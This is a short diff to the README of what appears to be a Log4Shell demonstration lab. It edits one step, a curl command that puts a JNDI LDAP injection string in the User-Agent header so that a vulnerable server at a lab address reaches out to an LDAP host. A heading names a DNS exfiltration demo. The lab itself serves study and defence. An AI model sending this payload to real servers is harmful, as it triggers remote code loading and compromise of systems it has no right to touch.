@@ -58,7 +58,7 @@ docker-compose build
 1. Start the docker containers in a second terminal
     1. `docker-compose up`
 1. In a third terminal, run the following. The second IP is the docker host
-    1. `curl -A "\${jndi:ldap://172.16.238.11:1389/a}" http://10.10.10.31:8080/log4shell`
+    1. `curl -A "\${jndi:ldap://172.16.238.11:1389/a}" http://10.10.10.31:8080`
 
 ### Run a DNS Exfil Demo on Recent Java 11 version
 
